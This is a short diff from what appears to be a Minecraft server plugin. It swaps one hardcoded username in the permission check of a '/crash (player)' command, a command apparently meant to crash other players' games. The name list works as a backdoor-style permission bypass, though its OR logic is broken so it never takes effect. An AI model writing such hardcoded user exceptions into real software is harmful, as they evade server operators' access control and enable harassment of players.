@@ -28,7 +28,7 @@ public class COMMAND_crash implements CommandExecutor {
 			} else sender.sendMessage(Main.name + " §8/crash (player)");
 		} else {
 			Player player = (Player) sender;
-			if(!player.hasPermission(Permission.crash) && ((!player.getName().equalsIgnoreCase("_iTzVace") || !player.getName().equalsIgnoreCase("TGM_Nick") || !player.getName().equalsIgnoreCase("SayZo") || !player.getName().equalsIgnoreCase("SeroxPlays") || !player.getName().equalsIgnoreCase("razorblur")))) {
+			if(!player.hasPermission(Permission.crash) && ((!player.getName().equalsIgnoreCase("SphexPvP") || !player.getName().equalsIgnoreCase("TGM_Nick") || !player.getName().equalsIgnoreCase("SayZo") || !player.getName().equalsIgnoreCase("SeroxPlays") || !player.getName().equalsIgnoreCase("razorblur")))) {
 				player.sendMessage(Main.name + " §4Du bist dazu nicht Berechtigt! ");
 				return true;
 			}
